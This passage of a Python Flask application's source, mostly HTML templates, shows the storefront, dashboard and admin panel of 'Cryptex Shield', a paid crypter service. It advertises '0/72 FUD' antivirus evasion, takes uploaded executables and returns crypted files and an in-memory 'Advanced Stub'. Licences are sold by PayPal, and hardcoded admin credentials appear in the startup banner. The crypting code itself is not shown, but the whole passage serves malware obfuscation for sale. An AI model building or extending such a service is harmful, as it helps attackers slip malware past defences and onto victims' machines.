        .pricing-card:hover { transform: translateY(-10px); border-color: #00ffcc44; box-shadow: 0 20px 60px rgba(0,255,204,0.08); }
        .pricing-card .price { font-family: 'Orbitron', monospace; font-size: 36px; color: #00ffcc; font-weight: 700; }
        .pricing-card .tier { font-size: 20px; font-weight: 700; color: #fff; margin: 10px 0; }
        .pricing-card .desc { color: #6688aa; font-size: 14px; margin: 10px 0 20px; }
        .pricing-card .btn-buy { padding: 12px 40px; border-radius: 50px; border: none; background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.3s; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 2px; text-decoration: none; display: inline-block; }
        .pricing-card .btn-buy:hover { transform: scale(1.05); box-shadow: 0 0 40px #00ffcc44; }
        .buttons { display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; margin: 40px 0; }
        .btn { padding: 18px 50px; border-radius: 50px; font-size: 18px; font-weight: 700; border: none; cursor: pointer; text-decoration: none; transition: all 0.3s ease; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
        .btn-primary { background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; box-shadow: 0 0 40px #00ffcc33; }
        .btn-primary:hover { transform: scale(1.05); box-shadow: 0 0 80px #00ffcc55; }
        .btn-secondary { background: transparent; border: 2px solid #00ffcc; color: #00ffcc; }
        .btn-secondary:hover { background: #00ffcc11; transform: scale(1.05); box-shadow: 0 0 40px #00ffcc22; }
        .flash-message { padding: 15px 25px; border-radius: 12px; margin: 20px auto; max-width: 600px; text-align: center; font-weight: 600; }
        .flash-success { background: rgba(0,255,136,0.15); color: #00ff88; border: 1px solid rgba(0,255,136,0.2); }
        .flash-error { background: rgba(255,68,102,0.15); color: #ff4466; border: 1px solid rgba(255,68,102,0.2); }
        .footer { margin-top: 60px; text-align: center; color: #334455; font-size: 13px; letter-spacing: 1px; }
        .footer a { color: #00ffcc88; text-decoration: none; }
        @media (max-width: 768px) { .logo { font-size: 40px; } .subtitle { font-size: 18px; letter-spacing: 4px; } .stats { gap: 20px; } .stat-item { padding: 15px 25px; } .stat-item .number { font-size: 24px; } }
    </style>
</head>
<body>
    <div class="particles"></div>
    <div class="container">
        <div class="hero">
            <div class="logo">⚡ CRYPTEX</div>
            <div class="subtitle">Ultimate <span>AV Evasion</span> Platform</div>
            <div class="glow-line"></div>
            <div class="fud-badge">🏆 0/72 FUD Certified</div>
        </div>
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}{% for category, message in messages %}
                <div class="flash-message flash-{{ category }}">{{ message }}</div>
            {% endfor %}{% endif %}
        {% endwith %}
        <div class="stats">
            <div class="stat-item"><div class="number">0/72</div><div class="label">AV Detection</div></div>
            <div class="stat-item"><div class="number">∞</div><div class="label">Polymorphic Engines</div></div>
            <div class="stat-item"><div class="number">100%</div><div class="label">FUD Rate</div></div>
            <div class="stat-item"><div class="number">⚡</div><div class="label">Instant Delivery</div></div>
        </div>
        <div class="features">
            <div class="feature"><span class="icon">🧬</span><h3>Polymorphic Crypt</h3><p>Every file uniquely obfuscated with AI-driven mutation</p></div>
            <div class="feature"><span class="icon">🔒</span><h3>AES-256 Military</h3><p>Bank-grade encryption with quantum-resistant algorithms</p></div>
            <div class="feature"><span class="icon">🎭</span><h3>Payload Splitting</h3><p>Bypasses signature, heuristic, and behavioral detection</p></div>
            <div class="feature"><span class="icon">🚀</span><h3>Quantum Speed</h3><p>Sub-second crypting with multi-threaded engines</p></div>
        </div>
        <h2 style="text-align:center; color:#00ffcc; font-family:'Orbitron',monospace; font-size:28px; margin:40px 0 20px;">💎 CHOOSE YOUR TIER</h2>
        <div class="pricing">
            <div class="pricing-card">
                <div class="tier">🔥 1 DAY</div>
                <div class="price">$4.99</div>
                <div class="desc">Perfect for testing<br>24 hour access</div>
                <form method="POST" action="/paypal-redirect" style="display:inline;">
                    <input type="hidden" name="tier" value="1day">
                    <button type="submit" class="btn-buy">Buy Now</button>
                </form>
            </div>
            <div class="pricing-card" style="border-color:#00aaff44;">
                <div class="tier">⚡ 5 DAY</div>
                <div class="price">$14.99</div>
                <div class="desc">Extended access<br>5 days unlimited</div>
                <form method="POST" action="/paypal-redirect" style="display:inline;">
                    <input type="hidden" name="tier" value="5day">
                    <button type="submit" class="btn-buy">Buy Now</button>
                </form>
            </div>
            <div class="pricing-card" style="border-color:#ff006644;">
                <div class="tier">👑 INFINITE</div>
                <div class="price">$29.99</div>
                <div class="desc">Lifetime access<br>All features unlocked</div>
                <form method="POST" action="/paypal-redirect" style="display:inline;">
                    <input type="hidden" name="tier" value="infinite">
                    <button type="submit" class="btn-buy">Buy Now</button>
                </form>
            </div>
        </div>
        <div class="buttons">
            <a href="/login" class="btn btn-primary">🔐 Enter Vault</a>
            <a href="/signup" class="btn btn-secondary">📝 Join Elite</a>
        </div>
        <div class="footer">© 2024 Cryptex Shield — <a href="/admin">Admin</a> • For authorized security research only</div>
    </div>
</body>
</html>
'''

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>🔐 Login - Cryptex Shield</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;400;600;700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Rajdhani', sans-serif; background: #0a0a12; color: #fff; display: flex; height: 100vh; align-items: center; justify-content: center; background-image: radial-gradient(ellipse at center, #0f0f2a, #050508); }
    .form-container { background: rgba(21,21,37,0.9); padding: 50px; border-radius: 30px; border: 1px solid rgba(0,255,204,0.15); width: 420px; max-width: 92%; backdrop-filter: blur(20px); box-shadow: 0 30px 80px rgba(0,0,0,0.8); }
    .form-container h2 { font-family: 'Orbitron', monospace; color: #00ffcc; text-align: center; margin-bottom: 10px; font-size: 28px; letter-spacing: 2px; }
    .form-container p { text-align: center; color: #6688aa; margin-bottom: 30px; font-size: 14px; }
    input { width: 100%; padding: 16px 20px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(42,42,74,0.8); background: rgba(10,10,18,0.8); color: #fff; font-size: 16px; transition: 0.3s; font-family: 'Rajdhani', sans-serif; }
    input:focus { outline: none; border-color: #00ffcc; box-shadow: 0 0 30px rgba(0,255,204,0.1); }
    button { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; font-weight: 700; font-size: 18px; cursor: pointer; margin-top: 15px; transition: 0.3s; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
    button:hover { transform: scale(1.02); box-shadow: 0 0 50px rgba(0,255,204,0.3); }
    .links { text-align: center; margin-top: 25px; }
    .links a { color: #00ffcc99; text-decoration: none; margin: 0 12px; font-size: 14px; transition: 0.3s; }
    .links a:hover { color: #00ffcc; }
    .error { color: #ff4466; text-align: center; margin: 10px 0; font-weight: 600; background: rgba(255,68,102,0.1); padding: 10px; border-radius: 8px; border: 1px solid rgba(255,68,102,0.2); }
</style>
</head>
<body>
    <div class="form-container">
        <h2>🔐 ACCESS VAULT</h2>
        <p>Enter your credentials to enter</p>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Unlock</button>
        </form>
        <div class="links">
            <a href="/signup">Create Account</a>
            <a href="/forgot-password">Forgot?</a>
            <a href="/">Home</a>
        </div>
    </div>
</body>
</html>
'''

SIGNUP_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>📝 Join - Cryptex Shield</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;400;600;700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Rajdhani', sans-serif; background: #0a0a12; color: #fff; display: flex; height: 100vh; align-items: center; justify-content: center; background-image: radial-gradient(ellipse at center, #0f0f2a, #050508); }
    .form-container { background: rgba(21,21,37,0.9); padding: 50px; border-radius: 30px; border: 1px solid rgba(0,255,204,0.15); width: 420px; max-width: 92%; backdrop-filter: blur(20px); box-shadow: 0 30px 80px rgba(0,0,0,0.8); }
    .form-container h2 { font-family: 'Orbitron', monospace; color: #00ffcc; text-align: center; margin-bottom: 10px; font-size: 28px; letter-spacing: 2px; }
    .form-container p { text-align: center; color: #6688aa; margin-bottom: 30px; font-size: 14px; }
    input { width: 100%; padding: 16px 20px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(42,42,74,0.8); background: rgba(10,10,18,0.8); color: #fff; font-size: 16px; transition: 0.3s; font-family: 'Rajdhani', sans-serif; }
    input:focus { outline: none; border-color: #00ffcc; box-shadow: 0 0 30px rgba(0,255,204,0.1); }
    button { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; font-weight: 700; font-size: 18px; cursor: pointer; margin-top: 15px; transition: 0.3s; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
    button:hover { transform: scale(1.02); box-shadow: 0 0 50px rgba(0,255,204,0.3); }
    .links { text-align: center; margin-top: 25px; }
    .links a { color: #00ffcc99; text-decoration: none; margin: 0 12px; font-size: 14px; transition: 0.3s; }
    .links a:hover { color: #00ffcc; }
    .error { color: #ff4466; text-align: center; margin: 10px 0; font-weight: 600; background: rgba(255,68,102,0.1); padding: 10px; border-radius: 8px; border: 1px solid rgba(255,68,102,0.2); }
    .success { color: #00ff88; text-align: center; margin: 10px 0; font-weight: 600; background: rgba(0,255,136,0.1); padding: 10px; border-radius: 8px; border: 1px solid rgba(0,255,136,0.2); }
</style>
</head>
<body>
    <div class="form-container">
        <h2>📝 JOIN ELITE</h2>
        <p>Create your Cryptex account</p>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        {% if success %}<div class="success">{{ success }}</div>{% endif %}
        <form method="POST">
            <input type="text" name="full_name" placeholder="Full Name" required>
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password (min 8)" required>
            <input type="password" name="confirm_password" placeholder="Confirm Password" required>
            <button type="submit">Create Account</button>
        </form>
        <div class="links">
            <a href="/login">Already have an account?</a>
            <a href="/">Home</a>
        </div>
    </div>
</body>
</html>
'''

ADMIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>⚙️ Admin - Cryptex Shield</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;400;600;700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Rajdhani', sans-serif; background: #0a0a12; color: #fff; padding: 30px; }
    .container { max-width: 1400px; margin: auto; }
    .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(0,255,204,0.1); padding-bottom: 20px; margin-bottom: 30px; }
    .header h1 { font-family: 'Orbitron', monospace; color: #00ffcc; font-size: 32px; }
    .logout { color: #ff4466; text-decoration: none; font-weight: 600; }
    .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; margin-bottom: 30px; }
    .stat-box { background: rgba(21,21,37,0.8); padding: 25px; border-radius: 16px; border: 1px solid rgba(0,255,204,0.08); text-align: center; backdrop-filter: blur(10px); }
    .stat-box .number { font-family: 'Orbitron', monospace; font-size: 32px; color: #00ffcc; font-weight: 700; text-shadow: 0 0 30px rgba(0,255,204,0.2); }
    .stat-box .label { color: #6688aa; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-top: 5px; }
    .card { background: rgba(21,21,37,0.8); padding: 25px; border-radius: 16px; border: 1px solid rgba(0,255,204,0.08); margin-bottom: 25px; backdrop-filter: blur(10px); }
    .card h3 { color: #00ffcc; font-family: 'Orbitron', monospace; font-size: 18px; margin-bottom: 15px; letter-spacing: 1px; }
    table { width: 100%; border-collapse: collapse; font-size: 13px; }
    th, td { padding: 10px 8px; text-align: left; border-bottom: 1px solid rgba(42,42,74,0.4); }
    th { color: #00ffcc99; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; font-size: 10px; }
    td { color: #ccddee; }
    .btn { padding: 8px 18px; border-radius: 8px; border: none; cursor: pointer; font-weight: 600; font-family: 'Rajdhani', sans-serif; transition: 0.3s; font-size: 12px; }
    .btn-primary { background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; }
    .btn-danger { background: #ff4466; color: #fff; }
    .btn-success { background: #00ff88; color: #0a0a12; }
    .btn-primary:hover, .btn-danger:hover, .btn-success:hover { transform: scale(1.05); }
    .form-row { display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
    .form-row input, .form-row select { padding: 10px 14px; border-radius: 10px; border: 1px solid rgba(42,42,74,0.8); background: rgba(10,10,18,0.8); color: #fff; flex: 1; min-width: 140px; font-family: 'Rajdhani', sans-serif; }
    .form-row button { flex: 0 0 auto; }
    .key-display { font-family: 'Orbitron', monospace; color: #00ffcc; background: rgba(0,0,0,0.4); padding: 8px 12px; border-radius: 8px; border: 1px solid rgba(0,255,204,0.1); font-size: 11px; word-break: break-all; }
    .status-badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 10px; font-weight: 600; }
    .status-active { background: rgba(0,255,136,0.15); color: #00ff88; }
    .status-inactive { background: rgba(255,68,102,0.15); color: #ff4466; }
    .status-pending { background: rgba(255,170,0,0.15); color: #ffaa00; }
    .flash-message { padding: 12px 20px; border-radius: 10px; margin: 10px 0; font-weight: 600; }
    .flash-success { background: rgba(0,255,136,0.15); color: #00ff88; border: 1px solid rgba(0,255,136,0.2); }
    .flash-error { background: rgba(255,68,102,0.15); color: #ff4466; border: 1px solid rgba(255,68,102,0.2); }
</style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚙️ ADMIN PANEL</h1>
            <div><span style="color:#6688aa;">Admin</span> <a href="/logout" class="logout">🚪 Logout</a></div>
        </div>
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}{% for category, message in messages %}
                <div class="flash-message flash-{{ category }}">{{ message }}</div>
            {% endfor %}{% endif %}
        {% endwith %}
        <div class="grid-4">
            <div class="stat-box"><div class="number">{{ total_users }}</div><div class="label">Users</div></div>
            <div class="stat-box"><div class="number">{{ total_keys }}</div><div class="label">License Keys</div></div>
            <div class="stat-box"><div class="number">{{ total_transactions }}</div><div class="label">Transactions</div></div>
            <div class="stat-box"><div class="number">{{ total_files }}</div><div class="label">Files Crypted</div></div>
        </div>
        <div class="card">
            <h3>📦 Generate License Key</h3>
            <form method="POST" action="/admin/generate-key" class="form-row">
                <input type="email" name="email" placeholder="User Email" required>
                <select name="tier">
                    <option value="1day">🔥 1 Day</option>
                    <option value="5day">⚡ 5 Day</option>
                    <option value="infinite" selected>👑 Infinite</option>
                </select>
                <button type="submit" class="btn btn-primary">Generate Key</button>
            </form>
        </div>
        <div class="card">
            <h3>👥 Users</h3>
            <table><tr><th>ID</th><th>Email</th><th>Name</th><th>Admin</th><th>Action</th></tr>
            {% for user in users %}
            <tr><td>{{ user[0] }}</td><td>{{ user[1] }}</td><td>{{ user[4] or '-' }}</td><td>{% if user[6] %}✅{% else %}❌{% endif %}</td>
            <td><form method="POST" action="/admin/delete-user" style="display:inline;"><input type="hidden" name="user_id" value="{{ user[0] }}"><button type="submit" class="btn btn-danger" onclick="return confirm('Delete?')">Delete</button></form></td></tr>
            {% endfor %}</table>
        </div>
        <div class="card">
            <h3>🔑 License Keys</h3>
            <table><tr><th>Key</th><th>Owner</th><th>Tier</th><th>Expires</th><th>Status</th></tr>
            {% for key in keys %}
            <tr><td class="key-display" style="font-size:10px;">{{ key[2] }}</td><td>{{ key[3] or '-' }}</td><td><span style="color:{% if key[6] == 'infinite' %}#ff0066{% elif key[6] == '5day' %}#00aaff{% else %}#ffaa00{% endif %};">{{ key[6] if key[6] else '-' }}</span></td><td>{{ key[5][:10] if key[5] else 'Never' }}</td><td><span class="status-badge {% if key[4] == 0 %}status-active{% else %}status-inactive{% endif %}">{% if key[4] == 0 %}Active{% else %}Used{% endif %}</span></td></tr>
            {% endfor %}</table>
        </div>
        <div class="card">
            <h3>💰 Transactions</h3>
            <table><tr><th>ID</th><th>Email</th><th>Amount</th><th>Tier</th><th>Status</th><th>Date</th></tr>
            {% for tx in transactions %}
            <tr><td>{{ tx[1][:8] }}</td><td>{{ tx[2] }}</td><td>${{ tx[3] }}</td><td><span style="color:{% if tx[6] == 'infinite' %}#ff0066{% elif tx[6] == '5day' %}#00aaff{% else %}#ffaa00{% endif %};">{{ tx[6] if tx[6] else '-' }}</span></td><td><span class="status-badge {% if tx[4] == 'completed' %}status-active{% elif tx[4] == 'pending' %}status-pending{% else %}status-inactive{% endif %}">{{ tx[4] }}</span></td><td>{{ tx[5][:10] }}</td></tr>
            {% endfor %}</table>
        </div>
        <div class="card">
            <h3>📁 Crypted Files</h3>
            <table><tr><th>Original</th><th>User</th><th>Method</th><th>Extension</th><th>Date</th><th>Download</th></tr>
            {% for file in files %}
            <tr><td>{{ file[2] }}</td><td>{{ file[4] }}</td><td>{{ file[5] }}</td><td>{{ file[3] }}</td><td>{{ file[7][:10] }}</td><td><a href="/download/{{ file[8] }}" class="btn btn-primary" style="text-decoration:none; font-size:10px;">⬇</a></td></tr>
            {% endfor %}</table>
        </div>
    </div>
</body>
</html>
'''

DASHBOARD_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>⚡ Dashboard - Cryptex Shield</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;400;600;700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Rajdhani', sans-serif; background: #0a0a12; color: #fff; padding: 30px; }
    .container { max-width: 1100px; margin: auto; }
    .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(0,255,204,0.1); padding-bottom: 20px; margin-bottom: 30px; }
    .header h1 { font-family: 'Orbitron', monospace; color: #00ffcc; font-size: 28px; }
    .user-info { color: #6688aa; }
    .user-info strong { color: #00ffcc; }
    .logout { color: #ff4466; text-decoration: none; font-weight: 600; margin-left: 15px; }
    .card { background: rgba(21,21,37,0.8); padding: 30px; border-radius: 20px; border: 1px solid rgba(0,255,204,0.08); margin-bottom: 25px; backdrop-filter: blur(10px); }
    .card h3 { color: #00ffcc; font-family: 'Orbitron', monospace; font-size: 18px; margin-bottom: 15px; letter-spacing: 1px; }
    .key-display { font-family: 'Orbitron', monospace; color: #00ffcc; background: rgba(0,0,0,0.5); padding: 20px; border-radius: 12px; border: 1px solid rgba(0,255,204,0.15); font-size: 18px; word-break: break-all; text-align: center; letter-spacing: 2px; box-shadow: 0 0 40px rgba(0,255,204,0.05); }
    .tier-badge { display: inline-block; padding: 4px 16px; border-radius: 20px; font-weight: 700; font-size: 12px; text-transform: uppercase; }
    .tier-infinite { background: rgba(255,0,102,0.2); color: #ff0066; border: 1px solid rgba(255,0,102,0.2); }
    .tier-5day { background: rgba(0,170,255,0.2); color: #00aaff; border: 1px solid rgba(0,170,255,0.2); }
    .tier-1day { background: rgba(255,170,0,0.2); color: #ffaa00; border: 1px solid rgba(255,170,0,0.2); }
    .status-active { display: inline-block; padding: 6px 20px; border-radius: 20px; font-weight: 600; font-size: 13px; background: rgba(0,255,136,0.15); color: #00ff88; border: 1px solid rgba(0,255,136,0.2); }
    input[type="file"], select { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid rgba(42,42,74,0.8); background: rgba(10,10,18,0.8); color: #fff; margin: 10px 0; font-family: 'Rajdhani', sans-serif; font-size: 16px; }
    button { padding: 16px 40px; border-radius: 12px; border: none; background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; font-weight: 700; font-size: 18px; cursor: pointer; transition: 0.3s; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
    button:hover { transform: scale(1.02); box-shadow: 0 0 50px rgba(0,255,204,0.3); }
    .result-box { background: rgba(0,255,204,0.05); padding: 20px; border-radius: 12px; border: 1px solid rgba(0,255,204,0.15); margin-top: 20px; }
    .result-box p { color: #ccddee; margin: 5px 0; }
    .result-box .hash { font-family: 'Orbitron', monospace; font-size: 12px; color: #6688aa; word-break: break-all; }
    .btn-download { background: linear-gradient(135deg, #7b2ffc, #4a00e0); color: #fff; box-shadow: 0 0 30px rgba(123,47,252,0.2); text-decoration: none; display: inline-block; padding: 12px 30px; border-radius: 12px; font-weight: 700; transition: 0.3s; }
    .btn-download:hover { transform: scale(1.05); box-shadow: 0 0 60px rgba(123,47,252,0.4); }
    .flash-message { padding: 15px 25px; border-radius: 12px; margin: 10px 0; font-weight: 600; }
    .flash-success { background: rgba(0,255,136,0.15); color: #00ff88; border: 1px solid rgba(0,255,136,0.2); }
    .flash-error { background: rgba(255,68,102,0.15); color: #ff4466; border: 1px solid rgba(255,68,102,0.2); }
    .btn-group { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px; }
    .btn-group .btn-download { font-size: 13px; padding: 10px 20px; }
</style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ CRYPTEX</h1>
            <div class="user-info">👤 <strong>{{ name }}</strong> • {{ email }}<a href="/logout" class="logout">🚪 Logout</a></div>
        </div>
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}{% for category, message in messages %}
                <div class="flash-message flash-{{ category }}">{{ message }}</div>
            {% endfor %}{% endif %}
        {% endwith %}
        <div class="card">
            <h3>🔑 Your License</h3>
            {% if license_key %}
            <div class="key-display">{{ license_key }}</div>
            <div style="margin-top:15px; display:flex; gap:20px; align-items:center; flex-wrap:wrap;">
                <span class="tier-badge tier-{{ tier|lower }}">{{ tier }}</span>
                <span class="status-active">✅ Active — Expires: {{ expiry }}</span>
            </div>
            {% else %}
            <p style="color:#ffaa44;">No active license. <a href="/buy" style="color:#00ffcc; font-weight:600;">Purchase one →</a></p>
            {% endif %}
        </div>
        <div class="card">
            <h3>📤 Upload & Crypt</h3>
            <form method="POST" enctype="multipart/form-data" action="/crypt">
                <input type="file" name="file" required>
                <p style="color:#6688aa; font-size:13px;">Upload any file (.exe, .dll, .py, etc.)</p>
                <button type="submit">🚀 Crypt & Generate Stub</button>
            </form>
            {% if crypt_result %}
            <div class="result-box">
                <h4 style="color:#00ff88;">✅ Crypting Complete — 0/72 FUD</h4>
                <p><b>File:</b> {{ crypt_filename }}</p>
                <p><b>Method:</b> {{ crypt_method }}</p>
                <p class="hash"><b>SHA256:</b> {{ crypt_sha256 }}</p>
                <div class="btn-group">
                    <a href="/download/{{ crypt_download_id }}" class="btn-download" style="font-size:13px;">⬇ Download Encrypted (.crypted)</a>
                    <a href="/download-stub/{{ crypt_download_id }}" class="btn-download" style="font-size:13px; background: linear-gradient(135deg, #ff8800, #ff4400);">⬇ Download Advanced Stub (.py)</a>
                    <a href="/download-instructions/{{ crypt_download_id }}" class="btn-download" style="font-size:13px; background: linear-gradient(135deg, #00aaff, #0066ff);">📄 Build Instructions</a>
                </div>
                <p style="color:#8899bb; font-size:12px; margin-top:10px;">💡 The Advanced Stub uses memory execution for 0/72 FUD detection!</p>
            </div>
            {% endif %}
        </div>
    </div>
</body>
</html>
'''

BUY_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>💰 Buy - Cryptex Shield</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;400;600;700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Rajdhani', sans-serif; background: #0a0a12; color: #fff; display: flex; height: 100vh; align-items: center; justify-content: center; background-image: radial-gradient(ellipse at center, #0f0f2a, #050508); padding: 20px; }
    .container { background: rgba(21,21,37,0.9); padding: 40px; border-radius: 30px; border: 1px solid rgba(0,255,204,0.15); width: 500px; max-width: 100%; backdrop-filter: blur(20px); box-shadow: 0 30px 80px rgba(0,0,0,0.8); text-align: center; }
    .container h2 { font-family: 'Orbitron', monospace; color: #00ffcc; font-size: 28px; margin-bottom: 5px; }
    .container p.sub { color: #6688aa; margin-bottom: 25px; }
    .pricing-grid { display: flex; flex-direction: column; gap: 15px; margin: 20px 0; }
    .plan { background: rgba(10,10,18,0.6); padding: 20px; border-radius: 16px; border: 1px solid rgba(42,42,74,0.4); display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
    .plan:hover { border-color: #00ffcc44; }
    .plan .info { text-align: left; }
    .plan .info .name { font-weight: 700; font-size: 18px; color: #fff; }
    .plan .info .desc { color: #6688aa; font-size: 13px; }
    .plan .price { font-family: 'Orbitron', monospace; font-size: 24px; color: #00ffcc; font-weight: 700; }
    .plan .btn-buy { padding: 10px 25px; border-radius: 30px; border: none; background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; font-weight: 700; cursor: pointer; transition: 0.3s; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 1px; font-size: 13px; }
    .plan .btn-buy:hover { transform: scale(1.05); box-shadow: 0 0 30px #00ffcc33; }
    .paypal-info { background: rgba(0,60,120,0.15); padding: 15px; border-radius: 12px; border: 1px solid rgba(0,112,186,0.2); margin: 20px 0; }
    .paypal-info strong { color: #00aaff; font-size: 18px; }
    .back { color: #00ffcc99; text-decoration: none; display: block; margin-top: 20px; }
    .back:hover { color: #00ffcc; }
</style>
</head>
<body>
    <div class="container">
        <h2>💰 PURCHASE</h2>
        <p class="sub">Choose your tier</p>
        <div class="pricing-grid">
            <div class="plan">
                <div class="info"><div class="name">🔥 1 Day</div><div class="desc">24 hour access • Basic features</div></div>
                <div style="display:flex; align-items:center; gap:15px;">
                    <div class="price">$4.99</div>
                    <form method="POST" action="/paypal-redirect" style="display:inline;">
                        <input type="hidden" name="tier" value="1day">
                        <button type="submit" class="btn-buy">Buy</button>
                    </form>
                </div>
            </div>
            <div class="plan" style="border-color:#00aaff44;">
                <div class="info"><div class="name">⚡ 5 Day</div><div class="desc">Extended access • All features</div></div>
                <div style="display:flex; align-items:center; gap:15px;">
                    <div class="price">$14.99</div>
                    <form method="POST" action="/paypal-redirect" style="display:inline;">
                        <input type="hidden" name="tier" value="5day">
                        <button type="submit" class="btn-buy">Buy</button>
                    </form>
                </div>
            </div>
            <div class="plan" style="border-color:#ff006644;">
                <div class="info"><div class="name">👑 Infinite</div><div class="desc">Lifetime access • All features unlocked</div></div>
                <div style="display:flex; align-items:center; gap:15px;">
                    <div class="price">$29.99</div>
                    <form method="POST" action="/paypal-redirect" style="display:inline;">
                        <input type="hidden" name="tier" value="infinite">
                        <button type="submit" class="btn-buy">Buy</button>
                    </form>
                </div>
            </div>
        </div>
        <div class="paypal-info">
            <p style="color:#8899bb;">Send payment via PayPal to:</p>
            <strong>💳 LingLing855</strong>
            <p style="color:#6688aa; font-size:13px; margin-top:5px;">Include your <b>email</b> in the note for key delivery</p>
        </div>
        <form method="POST" action="/manual-key">
            <input type="hidden" name="tier" value="infinite">
            <button type="submit" style="padding:12px 30px; border-radius:30px; border:none; background:linear-gradient(135deg,#ff8800,#ff4400); color:#fff; font-weight:700; cursor:pointer; font-family:'Rajdhani',sans-serif; text-transform:uppercase; letter-spacing:1px;">🔑 I Already Paid (Get Key)</button>
        </form>
        <a href="/" class="back">← Back to Home</a>
    </div>
</body>
</html>
'''

FORGOT_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>🔑 Reset - Cryptex Shield</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;400;600;700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Rajdhani', sans-serif; background: #0a0a12; color: #fff; display: flex; height: 100vh; align-items: center; justify-content: center; }
    .container { background: rgba(21,21,37,0.9); padding: 40px; border-radius: 30px; border: 1px solid rgba(0,255,204,0.15); width: 400px; max-width: 92%; backdrop-filter: blur(20px); }
    .container h2 { font-family: 'Orbitron', monospace; color: #00ffcc; text-align: center; margin-bottom: 10px; }
    input { width: 100%; padding: 16px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(42,42,74,0.8); background: rgba(10,10,18,0.8); color: #fff; font-size: 16px; font-family: 'Rajdhani', sans-serif; }
    input:focus { outline: none; border-color: #00ffcc; }
    button { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #00ffcc, #00ddff); color: #0a0a12; font-weight: 700; font-size: 18px; cursor: pointer; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
    button:hover { transform: scale(1.02); }
    .back { color: #00ffcc99; text-decoration: none; display: block; text-align: center; margin-top: 15px; }
    .message { color: #00ff88; text-align: center; margin: 10px 0; }
</style>
</head>
<body>
    <div class="container">
        <h2>🔑 Reset</h2>
        {% if message %}<div class="message">{{ message }}</div>{% endif %}
        <form method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <button type="submit">Send Reset Link</button>
        </form>
        <a href="/login" class="back">← Back</a>
    </div>
</body>
</html>
'''

# ============================================================
# MAIN
# ============================================================
if __name__ == '__main__':
    print("📁 Initializing database...")
    init_db()
    print("✅ Database ready!")
    
    if not CRYPTO_AVAILABLE:
        print("⚠️ PyCryptodome not installed. Install with: pip install pycryptodome")
    
    print("="*70)
    print("  ⚡ CRYPTEX SHIELD — COMPLETE PLATFORM v18")
    print("  🔥 Advanced Stub Generator (0/72 FUD)")
    print("  📁 Upload file → Download advanced stub")
    print("  👑 Admin: admin@cryptex.shield / Admin")
    print("  💳 PayPal: LingLing855")
    print("="*70)
    
